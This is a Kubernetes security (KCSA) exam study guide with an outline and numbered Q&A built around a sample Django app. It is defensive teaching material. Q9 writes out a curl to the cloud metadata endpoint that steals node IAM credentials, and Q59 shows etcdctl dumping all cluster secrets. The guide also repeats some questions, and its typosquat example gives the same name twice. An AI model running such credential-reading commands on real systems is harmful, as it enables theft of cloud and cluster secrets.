Before diving into the exam domains, this section builds your cloud native

F.1 What Is Cloud Native Security & Why Does It Matter?
    • The "4 Cs of Cloud Native Security": Cloud → Cluster → Container → Code
    • Why traditional perimeter security doesn't work in Kubernetes
    • The Shared Responsibility Model — where the cloud provider ends and YOU begin
    • Real-world breaches: Tesla cryptojacking, Shopify rogue insider, Capital One SSRF
    • The attack surface: API server, etcd, kubelet, container runtime, network, supply chain
    • KCSA exam philosophy: "Understand the security landscape, not just the tools"
    • Why anihpj/jobpost is your learning target: Django + PostgreSQL + Redis — a real attack surface
    • Defense-in-depth: No single security control is enough — layer them
    🟢 Novice

F.2 Security Terminology — The Lexicon You MUST Know
    • CIA Triad: Confidentiality, Integrity, Availability — the 3 pillars of security
    • Threat, Vulnerability, Risk, Exploit, Attack Vector, Attack Surface
    • CVE (Common Vulnerabilities and Exposures), CVSS (scoring 0-10), Zero-Day
    • OPA (Open Policy Agent), Kyverno, Falco, Trivy, Grype, Cosign, Sigstore
    • mTLS (mutual TLS), TLS termination, Certificate Authorities (CA), PKI (Public Key Infrastructure)
    • Pod Security Standards (PSS): Privileged, Baseline, Restricted
    • Security Context, seccomp, AppArmor, SELinux, capabilities, syscalls, namespaces
    • SBOM (Software Bill of Materials), SLSA framework, provenance, image immutability
    • Admission Controllers: Mutating vs Validating, webhooks, PSA (Pod Security Admission)
    • Audit Logs, Audit Policy, SIEM, threat detection, runtime security, behavioral analytics
    • eBPF (Extended Berkeley Packet Filter) — kernel-level observability without kernel modules
    • Zero Trust: "Never trust, always verify" — every request authenticated & authorized
    • Least Privilege: Give only the permissions needed, nothing more
    🟢 Novice

F.3 The Kubernetes Attack Surface — Where Threats Live
    • External Attack Vectors: API server (6443), kubelet (10250), etcd (2379), exposed dashboards
    • Internal Attack Vectors: Compromised pod → lateral movement → ServiceAccount token abuse
    • Supply Chain: Malicious images, poisoned dependencies, compromised registries, build pipeline attacks
    • Network: East-West traffic (pod-to-pod), North-South (external-to-cluster), DNS poisoning
    • Identity: ServiceAccount tokens, kubeconfig theft, RBAC misconfiguration, overly permissive roles
    • Data: Secrets in env vars, etcd unencrypted, logs leaking credentials, ConfigMap exposure
    • Workload: Privileged containers, hostPath mounts, hostNetwork, hostPID — breaking isolation
    • The "Crown Jewels" in anihpj/jobpost:
      - PostgreSQL data: user PII, job applications (GDPR/CCPA implications)
      - Django SECRET_KEY: session signing, CSRF tokens, password reset tokens
      - API tokens: JWT secrets, third-party integrations
      - Redis: session data, Celery task payloads (may contain PII)
    • MITRE ATT&CK for Containers/Kubernetes matrix — mapping threats to techniques
    🟢 Novice | 🟡 Intermediate: Attack path diagrams, kill chain analysis

F.4 anihpj/jobpost — The Application Under Attack
    • Full architecture diagram — where security controls apply at each layer
    • Django web tier: Static file serving, CSRF/XSS protections, session management, CSP headers
    • Django API tier: REST Framework authentication, JWT tokens, rate limiting, CORS configuration

1.1 The 4Cs of Cloud Native Security (6 Qs)
    Q1:  What are the "4 Cs" of Cloud Native Security?
         A) Cloud → Cluster → Container → Code
         Explanation: Each layer builds on the one below — you can't secure
         containers without first securing the cluster, and you can't secure
         the cluster without securing the cloud infrastructure.
         Analogy: Building a secure house — foundation (Cloud) → walls (Cluster) →
         rooms (Container) → valuables inside (Code).

    Q2:  At which layer does the "Shared Responsibility Model" end and YOUR
         responsibility begin in a managed Kubernetes service (EKS/AKS/GKE)?
         A) The control plane is the provider's responsibility;
            worker nodes, pods, network policies, and data are yours.
         Explanation: Cloud providers manage the API server, etcd, scheduler;
         YOU manage everything running ON the cluster.

    Q3:  Which of the following is an example of a "Cloud" layer security control?
         A) AWS IAM roles for node groups / Azure Managed Identity / GCP Workload Identity
         Explanation: Cloud-layer = IAM roles, VPC firewall rules, KMS key policies, CloudTrail.

    Q4:  Which of the following is a "Cluster" layer security control?
         A) RBAC (Role-Based Access Control) — controlling who can do what
            inside the Kubernetes API after they've authenticated.
         Explanation: Cluster-layer = API server security, etcd encryption,
         audit logging, admission controllers, NetworkPolicy.

    Q5:  Which of the following is a "Container" layer security control?
         A) Security Context — runAsNonRoot, readOnlyRootFilesystem,
            drop ALL capabilities, seccomp profiles.
         Explanation: Container-layer = pod security, image scanning, runtime
         security (Falco), resource limits (prevent noisy neighbor DoS).

    Q6:  Which of the following is a "Code" layer security control?
         A) Static Application Security Testing (SAST), dependency scanning,
            secrets detection in source code, code signing.
         Explanation: Code-layer = the "shift left" approach — catch security
         issues BEFORE they reach production: SAST, SCA, secret scanning in CI/CD.

1.2 Cloud Provider and Infrastructure Security (5 Qs)
    Q7:  In a self-managed kubeadm cluster (like your lab), who is responsible
         for securing etcd?
         A) YOU! In self-managed clusters, YOU are responsible for the ENTIRE
            stack — etcd, API server, certificates, kubelet, node OS, everything.
            The cloud provider only secures the physical data center (if using VMs).

    Q8:  How do cloud provider IAM roles integrate with Kubernetes security?
         A) IRSA (IAM Roles for Service Accounts) maps a Kubernetes ServiceAccount
            to an AWS IAM Role via OIDC federation. No static credentials stored
            in Secrets. Pods get temporary, auto-rotating credentials via STS.
         Same pattern: Azure AD Workload Identity, GCP Workload Identity Federation.

    Q9:  Why must you protect cloud metadata endpoints (169.254.169.254)?
         A) Cloud metadata endpoints expose IAM credentials. A compromised pod can
            curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
            → get the NODE's IAM credentials → access S3, DynamoDB, RDS.
            Prevention: iptables block, NetworkPolicy egress deny, use IRSA instead.

    Q10: In a managed Kubernetes service (EKS/AKS/GKE), what is the provider
         responsible for vs what YOU are responsible for?
         A) Provider: Control plane (API server, etcd, scheduler, controller-manager),
            control plane TLS certificates, etcd backup, Kubernetes version upgrades.
            YOU: Worker node OS patching, pod security, NetworkPolicy, RBAC, Secrets
            encryption, container images, data encryption, audit logging configuration.

    Q11: What is the "attack surface" of a Kubernetes cluster?
         A) The sum of all points where an attacker could enter or cause damage:
            API server (6443), kubelet (10250), etcd (2379), exposed dashboards,
            container images, supply chain, weak NetworkPolicies, leaked kubeconfigs.

1.3 Controls and Frameworks (5 Qs)
    Q12: Why does defense-in-depth matter in cloud native security?
         A) No single security control is 100% effective. Multiple layers ensure
            that if one control fails, others still protect the system.
         Analogy: Castle with walls (NetworkPolicy), moat (TLS), guards (Falco),
         locked doors (RBAC), dungeon guard (seccomp). Breach one layer → face another.

    Q13: What is the Zero Trust security model?
         A) "Never trust, always verify." Every request — even from inside the
            cluster — must be authenticated, authorized, and encrypted. No implicit
            trust based on network location (e.g., "it's internal traffic, it's safe").
         Analogy: Airport where EVERY person — passengers AND staff — must show ID
         at every checkpoint, not just at the entrance.

    Q14: How does Zero Trust apply to pod-to-pod communication in Kubernetes?
         A) Default-deny NetworkPolicy + mTLS between services. Without it, any pod
            can talk to any other pod — the OPPOSITE of Zero Trust.
            With Zero Trust: only explicitly allowed connections work, and all
            connections are encrypted + mutually authenticated.

    Q15: What is the "principle of least privilege" and how does it apply in K8s?
         A) Every subject (user, ServiceAccount, pod) should have ONLY the permissions
            needed to do its job — and NOTHING MORE. If anihpj-web doesn't need to
            list secrets, its ServiceAccount shouldn't have that permission.
            RBAC + NetworkPolicy + Pod Security Standards all enforce least privilege.

    Q16: How does the Kubernetes API server enforce controls for every request?
         A) Every request goes through 3 stages:
            ① Authentication: Validate the certificate/token — WHO is this?
            ② Authorization: Check RBAC — CAN they do this action?
            ③ Admission Control: Apply policies — SHOULD we allow this?
            All 3 must pass. If ANY stage fails → request DENIED.

1.4 Isolation Techniques (4 Qs)
    Q17: What are the isolation boundaries in Kubernetes?
         A) ① Namespace isolation: RBAC + NetworkPolicy + ResourceQuota per namespace
            ② Container isolation: Linux namespaces (PID, net, mnt, UTS, IPC, user)
               + cgroups (resource limits) — containers share the host KERNEL
            ③ Pod isolation: Containers in same pod share network + IPC namespace
            ④ Node isolation: Taints/tolerations, nodeSelectors for dedicated nodes
            ⑤ Strong isolation: gVisor (user-space kernel), Kata Containers (per-pod VM),
               Firecracker microVMs for untrusted workloads

    Q18: In anihpj/jobpost, what permissions does the anihpj-db pod actually NEED?
         A) NONE! The PostgreSQL pod doesn't need any Kubernetes API access.
            Set automountServiceAccountToken: false — no token mounted, no API
            access possible. The database just stores data; it never calls kubectl.

    Q19: Why shouldn't you use the "default" ServiceAccount in every namespace?
         A) The default SA is auto-mounted in every pod (unless disabled). If all
            pods share one SA, compromise of ANY pod gives attacker the SAME
            permissions. Create dedicated SAs per workload with minimal RBAC.

    Q20: What is the blast radius concept and how do you minimize it?
         A) Blast radius = damage a single compromise can cause. Minimize via:
            • Namespace isolation: each app in own namespace with separate RBAC
            • Least privilege RBAC: SAs with minimal permissions
            • NetworkPolicy: restrict pod-to-pod communication
            • Dedicated ServiceAccounts: compromise of api SA ≠ access to db SA

1.5 Artifact Repository and Image Security (4 Qs)
    Q21: What is a container image registry and what security controls apply?
         A) A registry stores and distributes container images (Docker Hub, ECR, GCR,
            Harbor, ACR). Security controls:
            • Private registries: restrict who can pull images
            • Image scanning: detect CVEs before deployment (Trivy, Grype)
            • Tag immutability: prevent tag overwrite attacks
            • Image signing: Cosign/Sigstore verifies who built the image
            • Lifecycle policies: auto-delete old/unused images (reduce attack surface)

    Q22: What is a "supply chain attack" in the context of container images?
         A) An attack compromising your software BEFORE it reaches the cluster —
            poisoned base images, malicious dependencies, compromised build servers,
            tampered CI/CD pipelines, untrusted registries, typosquatted image names.
            Example: Attacker publishes "anihpj-api" (typo of anihpj-api) on Docker Hub
            with a backdoor — developer accidentally pulls it.

    Q23: Why should you pin container images by SHA256 digest instead of tags?
         A) Tags are MUTABLE pointers — :latest today ≠ :latest tomorrow.
            SHA256 digest is CONTENT-ADDRESSABLE — the hash IS the identity.
            If content changes, hash changes. Pinning digests ensures deployments
            use EXACTLY the image that was tested and approved.
            Example: image: anihpj-api@sha256:8a3f4b9c... (not anihpj-api:v1.2.3)

    Q24: What is the difference between a public and private container registry?
         A) Public (Docker Hub): Anyone can pull. Risk: pull untested images, rate
            limits, supply chain risk. Good for: base images, open-source.
            Private (ECR, Harbor, ACR): Only authenticated users/services can pull.
            Benefits: control what images exist, scan all images, enforce signing
            policies, audit who pulled what. Best practice: ALL production images
            must come from private registries.

1.6 Workload and Application Code Security (4 Qs)
    Q25: An anihpj-api pod is compromised by an RCE vulnerability. Without least
         privilege RBAC, what can the attacker do?
         A) If the ServiceAccount has cluster-admin: the attacker owns the ENTIRE
            cluster — can read all secrets, delete all pods, exfiltrate all data.
            With least privilege (only get/list pods in anihpj namespace): the
            attacker can only see pod names — blast radius is MINIMIZED.

    Q26: What is the difference between SAST and DAST for application security?
         A) SAST (Static): Analyzes source code WITHOUT running it — finds SQL
            injection, XSS, hardcoded secrets before you build.
            DAST (Dynamic): Tests the RUNNING application from the outside — finds
            runtime misconfigurations, exposed endpoints, auth bypasses.
            Both needed: SAST shifts left (catch early), DAST validates runtime.

    Q27: For anihpj/jobpost, what application-level security controls exist?
         A) Python/Django: Bandit (SAST), django-secure middleware, CSRF tokens,
            XSS protection, SQL injection prevention (ORM parameterized queries),
            CSP headers, SECURE_SSL_REDIRECT, HSTS, secure session cookies.
            Dockerfile: Hadolint linting, multi-stage build, distroless base.
            CI/CD: Trivy scan → fail on CRITICAL CVEs, Kubesec manifest scoring.

    Q28: What makes the anihpj-web pod's attack surface different from anihpj-api?
         A) anihpj-web is exposed to the internet via Ingress — it faces North-South
            traffic with potentially malicious actors. anihpj-api only receives
            East-West traffic from web (internal). Web has a LARGER attack surface.
         Real-world: Web tier needs WAF, rate limiting, input validation, CSP headers.

2.1 API Server (6 Qs)
    Q29: What happens when a request arrives at the API server? (Full flow)
         A) ① TLS Termination → ② Authentication (Who?) → ③ Authorization (Can they?)
            → ④ Mutating Admission → ⑤ Schema Validation → ⑥ Validating Admission
            → ⑦ etcd Write (encrypted). Every step is a security gate.

    Q30: Why should you set --anonymous-auth=false on the API server?
         A) With anonymous auth enabled, unauthenticated requests are treated as
            user "system:anonymous" and STILL CHECKED against RBAC. Misconfigured
            RBAC could grant anonymous users access. Setting false means:
            "No credentials = No access. Period."

    Q31: What are the three main authentication methods in Kubernetes?
         A) ① X.509 Client Certificates (kubelet, control plane components)
            ② Bearer Tokens / JWT ServiceAccount tokens (pods, time-bound)
            ③ OpenID Connect / OIDC (human users — Google, GitHub, Azure AD, Okta)

    Q32: How does the API server protect against man-in-the-middle attacks?
         A) ① TLS encryption for ALL communications
            ② Client certificate validation (kubelet must present valid cert)
            ③ ServiceAccount tokens are JWTs signed by the API server
            ④ --tls-cert-file and --tls-private-key-file at startup
            ⑤ All certificates signed by the cluster CA (established at cluster init)

    Q33: What happens if you lose the cluster's CA certificate and key?
         A) CATASTROPHE. The CA signs ALL cluster certificates. Without it:
            can't issue new certs, can't renew expiring certs (cluster stops),
            can't create ServiceAccount tokens. BACK UP YOUR CA KEY!

    Q34: How does the NodeRestriction admission controller improve API server security?
         A) Limits kubelet to ONLY modifying its own node's objects. Compromised
            kubelet on worker-1 CAN'T modify worker-2 labels/taints, read worker-2
            secrets, or impersonate another kubelet.

2.2 Controller Manager (3 Qs)
    Q35: What is the role of kube-controller-manager in cluster security?
         A) Runs controllers that reconcile desired vs actual state — including
            the ServiceAccount token controller (creates tokens for every SA) and
            the certificate signing controller. A compromised controller-manager
            could create backdoor ServiceAccounts with cluster-admin privileges.
            Always audit its actions.

    Q36: What security properties does the cloud-controller-manager add?
         A) Interacts with cloud provider APIs to create load balancers, manage
            storage volumes, update node metadata. Must use dedicated IAM roles
            with least privilege — never give it broader cloud access than needed.

    Q37: How does the controller-manager authenticate to the API server?
         A) Via X.509 client certificate signed by the cluster CA, or a kubeconfig
            file with embedded credentials. Uses --kubeconfig flag pointing to
            /etc/kubernetes/controller-manager.conf with restricted permissions.

2.3 Scheduler (3 Qs)
    Q38: What is the role of the kube-scheduler in cluster security?
         A) Decides WHERE pods run. A compromised scheduler could:
            • Place sensitive pods on attacker-controlled nodes
            • Refuse to schedule security tools (Falco, OPA, monitoring)
            • Concentrate all pods on one node (denial of service via resource exhaustion)
            Mitigation: run scheduler with minimal RBAC, audit its binding decisions.

    Q39: How does the scheduler decide which node to place a pod on?
         A) ① Filtering: Eliminate nodes that don't meet requirements (resources,
            taints, nodeSelectors, affinity). ② Scoring: Rank remaining nodes by
            fitness (least requested, most balanced, spreading). ③ Binding: Assign
            pod to the highest-scoring node. Security: taints/tolerations prevent
            sensitive pods from landing on compromised or untrusted nodes.

    Q40: How can taints and tolerations be used as a security control?
         A) Taint critical nodes with NoSchedule to repel all pods EXCEPT those
            with specific tolerations. Example: "Only the security monitoring
            DaemonSet can run on the control plane. All other pods are repelled."
            This prevents workload pods from accidentally or maliciously running
            on infrastructure nodes.

2.4 Kubelet (5 Qs)
    Q41: Why is the kubelet considered a critical security boundary?
         A) Runs on EVERY node with root-level access: starts/stops containers
            (CRI), reads pod specs (including Secrets), accesses node filesystem,
            reports node status. A compromised kubelet = compromised node.

    Q42: What ports does the kubelet listen on and what are the security implications?
         A) ① 10250: Kubelet API (pod specs, logs, exec). MUST use TLS + auth.
               If exposed without auth → anyone can exec into any pod on that node.
            ② 10255: Read-only API (deprecated). Exposes pod info without auth.
            ③ 10248: Health check endpoint (reveals kubelet status only).

    Q43: Why should you set --anonymous-auth=false on the kubelet?
         A) With anonymous auth enabled, unauthenticated requests to port 10250 are
            treated as user "system:anonymous" and still checked against authorization.
            If authorization is misconfigured, anonymous users could exec into pods.

    Q44: How does the kubelet authenticate to the API server?
         A) Uses X.509 client certificate (kubelet.crt) signed by cluster CA. The
            certificate's CN must be "system:node:<node-name>" and Organization
            must be "system:nodes" — these RBAC groups grant kubelet permissions.

    Q45: What are static pods and what unique security risk do they pose?
         A) Static pods defined by YAML in /etc/kubernetes/manifests/ — kubelet
            auto-creates them. Risk: anyone with write access to this directory
            can create pods with ANY configuration (privileged, host mounts).
            Protection: strict file permissions (root only), audit file changes.

2.5 Container Runtime (4 Qs)
    Q46: What is a Container Runtime and why does its security matter?
         A) The container runtime (containerd, CRI-O) actually runs containers on
            each node. It interfaces with the kernel via namespaces and cgroups.
            A runtime vulnerability (e.g., CVE-2019-5736 — runc container escape)
            allows containers to break isolation and access the host.

    Q47: What is the difference between runc, gVisor, and Kata Containers?
         A) runc: Default OCI runtime. Containers share the host kernel (fastest,
            least isolation). gVisor: User-space kernel (Sentry) intercepts syscalls
            — ~200 safe syscalls reach the real kernel. Kata Containers: Each pod
            gets a dedicated lightweight VM (QEMU/Firecracker) with its OWN kernel.
            Security: runc < gVisor < Kata (strongest isolation, highest overhead).

    Q48: What is RuntimeClass and how is it used for security?
         A) RuntimeClass allows selecting different container runtimes PER POD:
            • Default workload → runc (fast, shared kernel)
            • Untrusted workload → gVisor (user-space kernel, sandboxed)
            • Highly sensitive → Kata Containers (hardware VM isolation)
            Defined via RuntimeClass CRD + pod.spec.runtimeClassName field.

    Q49: Why should you keep the container runtime updated?
         A) Runtime CVEs are the most dangerous — they enable CONTAINER ESCAPE.
            CVE-2019-5736 (runc): overwritten host runc binary from inside container
            → attacker's code runs as ROOT on the HOST on the NEXT container exec.
            Regular updates + CVE monitoring for containerd/CRI-O are critical.

2.6 KubeProxy (3 Qs)
    Q50: What is kube-proxy and what security implications does it have?
         A) Implements Service abstraction: virtual ClusterIP → real pod IPs via
            iptables/IPVS rules on every node. Security concerns: iptables mode
            has sequential rule processing (DDoS amplification risk with many
            services). IPVS mode uses hash tables (O(1), more resilient). Run
            kube-proxy with minimal RBAC — it doesn't need privileged access.

    Q51: What's the security difference between iptables and IPVS mode?
         A) iptables: Sequential rules. 5000 services → 25000+ rules traversed per
            packet → latency + CPU overhead under load. IPVS: Kernel-level L4 LB
            with hash table → O(1) lookup regardless of service count. IPVS is
            more resilient to DDoS attacks on Service IPs.

    Q52: How should kube-proxy be configured securely in production?
         A) ① Use IPVS mode (--proxy-mode=ipvs) for DDoS resilience
            ② Bind to localhost only (--bind-address=127.0.0.1)
            ③ Use minimal RBAC (kube-proxy doesn't need cluster-admin)
            ④ Enable metrics securely (--metrics-bind-address=127.0.0.1:10249)
            ⑤ Run as non-root (kube-proxy supports non-root operation since 1.23)

2.7 Pod (4 Qs)
    Q53: What security boundaries does a Pod provide?
         A) A Pod is the smallest deployable unit — 1+ containers sharing:
            • Network namespace (same IP, same localhost, share ports)
            • IPC namespace (shared memory between containers)
            • Volumes (shared filesystem mounts)
            • PID namespace (containers can see each other's processes if enabled)
            Security implication: containers in the SAME pod are NOT isolated from
            each other. If one container is compromised, sibling containers are
            directly accessible via localhost.

    Q54: What is the difference between a Pod and a static Pod?
         A) Regular Pod: Created via API server → stored in etcd → scheduled by
            scheduler → kubelet starts it. Controller-managed (Deployment, etc.).
            Static Pod: Created by kubelet watching /etc/kubernetes/manifests/
            directory. NO API server involvement. NO controller managing it.
            Control plane components (API server, etcd, scheduler) ARE static pods.

    Q55: What are the security implications of hostNetwork, hostPID, and hostIPC?
         A) hostNetwork: Pod uses the NODE's network namespace (not its own) → can
            sniff ALL node traffic, bypass NetworkPolicy. hostPID: Pod sees ALL
            host processes → can kill/signal any process. hostIPC: Pod shares
            inter-process communication with host → can access host shared memory.
            NEVER use these for application pods. Only for system daemons.

    Q56: How does Pod Security Admission (PSA) enforce pod-level security?
         A) PSA labels on namespaces (pod-security.kubernetes.io/enforce=restricted)
            validate every pod creation request against Pod Security Standards:
            • Privileged: No restrictions (system pods only)
            • Baseline: Blocks known privilege escalations (no hostPath, hostNetwork,
              privileged containers, CAP_SYS_ADMIN)
            • Restricted: Must run as non-root, drop ALL caps, seccomp required

2.8 Etcd (6 Qs)
    Q57: What data is stored in etcd and why is it the "crown jewels"?
         A) EVERYTHING: Pods, Deployments, Services, Secrets, ConfigMaps, RBAC
            rules, ServiceAccount tokens, CRDs — the entire cluster state. If you
            can read etcd, you can read every Secret (if encryption is not enabled).
            etcd compromise = TOTAL cluster compromise.

    Q58: How do you secure etcd communication?
         A) ① Peer TLS: --peer-cert-file, --peer-key-file (between etcd members)
            ② Client TLS: --cert-file, --key-file (API server → etcd)
            ③ --peer-client-cert-auth=true: ALL peers must present valid certs
            ④ --client-cert-auth=true: ALL clients must present valid certs

    Q59: Why is etcd encryption at rest critical?
         A) By default, Secrets in etcd are stored as base64 — NOT encrypted.
            Anyone with etcd access: `etcdctl get /registry/secrets/` reads ALL
            secrets in plaintext. EncryptionConfiguration encrypts secrets BEFORE
            etcd write (AES-CBC, AES-GCM, or KMS). Without it: etcd access = total
            secret compromise.

    Q60: How many etcd nodes for HA and WHY an odd number?
         A) 3 or 5 nodes. etcd uses RAFT consensus: Quorum = (N/2) + 1. Odd numbers
            prevent split-brain (tie votes). 3 nodes tolerate 1 failure, 5 tolerate 2.
            NEVER 2 nodes (quorum = 2, tolerates 0 failures).

    Q61: What happens during an etcd leader election?
         A) Leader fails → nodes detect timeout (heartbeat, ~1s) → increment term →
            request votes → first to majority becomes leader → starts accepting writes.
            During election: cluster is READ-ONLY. Duration: 1-3 seconds typically.
            Frequent elections = network or disk problems.

    Q62: How often should you back up etcd and where should backups be stored?
         A) Before/after every upgrade. Best practice: daily automated snapshots
            (cron job), before destructive operations. Store OFF-cluster (S3, GCS,
            Azure Blob). If the cluster is destroyed, on-cluster backups die too.
            Command: ETCDCTL_API=3 etcdctl snapshot save /backup/etcd-$(date +%Y%m%d).db

2.9 Container Networking (5 Qs)
    Q63: What is a CNI (Container Network Interface) plugin and its security role?
         A) Implements the Kubernetes networking model: every pod gets a unique,
            routable IP. Pods on same/different nodes communicate without NAT.
            Popular CNIs: Calico (NetworkPolicy + BGP), Cilium (eBPF + encryption),
            Flannel (simple overlay), Weave (encryption built-in).
            Security: The CNI ENFORCES NetworkPolicy — if CNI doesn't support it,
            your policies are stored but NEVER enforced.

    Q64: How does Cilium improve security beyond traditional CNIs?
         A) Uses eBPF for kernel-level enforcement (no iptables traversal). Benefits:
            • Line-rate performance (iptables degrades with rule count)
            • Identity-based security (pod labels, not just IP)
            • L7 policies (HTTP method, path — not just port)
            • Transparent encryption (WireGuard/IPsec between nodes)
            • Hubble: real-time observability (pod, namespace, DNS, labels)

    Q65: In anihpj/jobpost, how would you design NetworkPolicies for the tiers?
         A) ① Default-deny all ingress + egress (Zero Trust baseline)
            ② Allow web → api:8000 (podSelector: app=anihpj-api, port 8000)
            ③ Allow api → db:5432 (podSelector: app=anihpj-db, port 5432)
            ④ Allow api → redis:6379 (podSelector: app=anihpj-redis, port 6379)
            ⑤ Allow all → DNS (UDP 53 to kube-system/coredns)
            Result: Each tier can ONLY talk to its downstream dependency.

    Q66: Why should the CNI configuration directory (/etc/cni/net.d/) be protected?
         A) CNI configs tell the runtime HOW to set up pod networking. Attacker
            with write access can: install malicious plugin (redirect traffic),
            change IP ranges (break NetworkPolicies), disable networking (DoS).
            Protection: chmod 700, root-only, audit file changes.

    Q67: What does a default-deny NetworkPolicy look like and why use it?
         A) podSelector: {} (all pods in namespace), policyTypes: [Ingress], no
            ingress rules → ALL incoming traffic DENIED. Then ADD specific policies
            for needed traffic. This is Zero Trust networking: deny everything,
            explicitly allow what's needed.

2.10 Client Security (3 Qs)
    Q68: What is a kubeconfig file and what security risks does it pose?
         A) A kubeconfig contains cluster endpoint, user credentials (cert/key or
            token), and context. If leaked: attacker has full access with that
            user's permissions. Protection: never commit to Git, use OIDC (no
            long-lived credentials), rotate regularly, restrict file permissions.

    Q69: Why should human operators use OIDC instead of certificate-based auth?
         A) ① MFA supported by the identity provider (Google, Azure AD, Okta)
            ② Centralized user lifecycle (one place to revoke access)
            ③ Audit trail: "which human ran this kubectl delete?"
            ④ No shared kubeconfig files with embedded long-lived credentials
            ⑤ Short-lived tokens (auto-refresh via kubectl oidc-login plugin)

    Q70: What is the "client" in Kubernetes security context?
         A) Any entity making API requests: kubectl users, CI/CD pipelines,
            controllers, operators, webhooks, monitoring tools. Each client must:
            ① Authenticate (prove identity)
            ② Be authorized (RBAC — what can this client do?)
            ③ Use TLS (encrypted communication)
            ④ Have its actions audited (audit log)

2.11 Storage (2 Qs)
    Q71: How does storage security relate to cluster component security?
         A) ① CSI drivers run as privileged pods — a compromised CSI driver can
               access ALL volumes on a node. ② PVs/PVCs store persistent data —
               if not encrypted, data at rest is exposed. ③ hostPath volumes mount
               node filesystem into pods — if misused, pods can read/write ANY
               file on the node. ④ StorageClass provisioners need cloud API access —
               must use least privilege IAM roles.

    Q72: What are the security implications of hostPath volumes?
         A) hostPath mounts the NODE's filesystem into a pod. Risks:
            • Mounting / → pod gets FULL node filesystem access (container escape)
            • Mounting /var/run/docker.sock → pod controls host's container runtime
            • Mounting /etc/kubernetes → pod can read/modify cluster certificates
            • Mounting /proc or /sys → pod can modify kernel parameters
            Mitigation: NEVER use hostPath for application pods. Use PV/PVC with
            CSI drivers instead. If hostPath is unavoidable, use readOnly + specific
            subPath and restrict via Pod Security Standards.

3.1 Pod Security Standards (6 Qs)
    Q73: What are the three Pod Security Standard levels?
         A) ① Privileged: No restrictions — unrestricted policy. For system/infra
               workloads that need host access (CNI plugins, CSI drivers, logging
               agents). ⚠️ Use sparingly!
            ② Baseline: Minimal restrictive — blocks known privilege escalations.
               No hostPath, no hostNetwork, no privileged containers, no hostPID.
               Default for most production workloads.
            ③ Restricted: Heavily restricted — follows pod hardening best practices.
               Must run as non-root, drop ALL capabilities, no privilege escalation,
               seccomp profile required. For highly sensitive workloads.

    Q74: What exactly does the "Baseline" policy prevent?
         A) hostProcess containers (Windows), hostNetwork, hostPID, hostIPC,
            hostPath volumes, privileged containers, CAP_SYS_ADMIN, CAP_NET_RAW,
            CAP_SYS_PTRACE, hostPorts, AppArmor profile as "unconfined", SELinux
            type as "unconfined", /proc mount type as "Unmasked".
            In plain English: "No sharing the node's network, processes, or
            filesystem. No privileged mode. No dangerous capabilities."

    Q75: What exactly does the "Restricted" policy prevent (beyond Baseline)?
         A) Everything Baseline prevents PLUS:
            • runAsNonRoot: true — CANNOT run as UID 0
            • seccompProfile must be RuntimeDefault or Localhost (not Unconfined)
            • capabilities.drop must include ALL
            • allowPrivilegeEscalation: false
            • Volume types restricted (no hostPath, no CSI ephemeral with privileged)
            In plain English: "The pod runs as a regular user, has no special
            kernel powers, and can't break out of its container."

    Q76: How do you enforce Pod Security Standards on a namespace?
         A) Using Pod Security Admission labels on the namespace:
            pod-security.kubernetes.io/enforce: restricted
            pod-security.kubernetes.io/enforce-version: latest
            pod-security.kubernetes.io/audit: restricted   (log violations)
            pod-security.kubernetes.io/warn: restricted    (warn user in kubectl)
            Three modes:
            • enforce: REJECT pods that violate the policy
            • audit: LOG violations (don't block — useful for monitoring)
            • warn: SHOW warning to user (like a compiler warning)

    Q77: What's a good PSA strategy for anihpj/jobpost across dev, staging, prod?
         A) dev namespace:    enforce=baseline, audit=restricted
            staging namespace: enforce=baseline, warn=restricted
            prod namespace:   enforce=restricted
            This gradually tightens security as code moves through environments.
            Devs see violations in audit logs → fix before it reaches production →
            enforcement catches anything that slipped through.

    Q78: Why should a CI/CD pipeline (Jenkins, GitLab Runner) namespace use
         "privileged" PSS level?
         A) CI/CD runners often need to build container images (Docker-in-Docker
            or Kaniko with hostPath), which requires elevated privileges. This is
            an EXCEPTION — CI/CD namespaces should be heavily locked down in OTHER
            ways: strict RBAC (only CI service account), NetworkPolicy (no egress
            except to registry), resource quotas (prevent runaway builds).

    Q79: What happens if you label a namespace enforce=restricted but deploy a pod
         with runAsUser: 0 (root)?
         A) The pod is REJECTED at admission time — it's never created. The kubectl
            output shows: "Error from server (Forbidden): pods "bad-pod" is forbidden:
            violates PodSecurity 'restricted:latest': runAsUser=0 (pod must not set
            runAsUser=0)." The pod YAML is valid Kubernetes, but the admission
            controller blocks it.

    Q80: Can you have different PSA levels for different pods in the SAME namespace?
         A) No. PSA labels are per-NAMESPACE — they apply to ALL pods in that
            namespace. If you need different security levels for different pods,
            put them in different namespaces. This is intentional: it encourages
            proper namespace isolation (dev/staging/prod should be different
            namespaces anyway).

3.3 Authentication (6 Qs)
    Q84: What is the difference between "authentication" and "authorization"?
         A) Authentication = "Who are you?" (X.509 cert, JWT token, OIDC).
            Authorization = "What are you allowed to do?" (RBAC: Role + RoleBinding).
            Both are required — knowing who someone IS doesn't mean they should
            be allowed to do everything.

    Q85: What are the three main authentication methods in Kubernetes?
         A) ① X.509 Client Certificates: Strong but hard to rotate. Used by kubelet
               and control plane components.
            ② Bearer Tokens / JWT ServiceAccount tokens: Used by pods via projected
               volumes. Time-bound (default 1 hour).
            ③ OpenID Connect (OIDC): Delegate auth to external IdP (Google, GitHub,
               Azure AD, Okta). Best for human users — supports MFA.

    Q86: How does a pod authenticate to the Kubernetes API?
         A) The projected ServiceAccount token volume auto-mounts three files:
            /var/run/secrets/kubernetes.io/serviceaccount/token (JWT),
            ca.crt (CA cert), and namespace. The pod presents the token in the
            Authorization: Bearer <token> header. The ca.crt verifies the API
            server's TLS certificate (prevents MITM).

    Q87: What is the difference between legacy tokens and projected (bound) tokens?
         A) Legacy tokens: Non-expiring, stored in a Secret, valid forever.
            Bound (projected) tokens: Time-bound (default 1h, max 24h), audience-
            bound, kubelet rotates automatically. Since Kubernetes 1.21+, bound
            tokens are the DEFAULT. Always prefer them.

    Q88: In the anihpj/jobpost cluster, which authentication method should human
         operators use and why?
         A) OIDC (e.g., GitHub SSO or Azure AD). Benefits: MFA supported, centralized
            user lifecycle, audit trail per human, no shared kubeconfig files with
            embedded long-lived credentials, short-lived auto-refreshing tokens.

    Q89: How does the API server protect against man-in-the-middle attacks?
         A) ① TLS encryption for ALL communications
            ② Client certificate validation (kubelet must present valid cert)
            ③ ServiceAccount tokens are JWTs signed by the API server
            ④ All certificates signed by the cluster CA

3.4 Authorization (7 Qs)
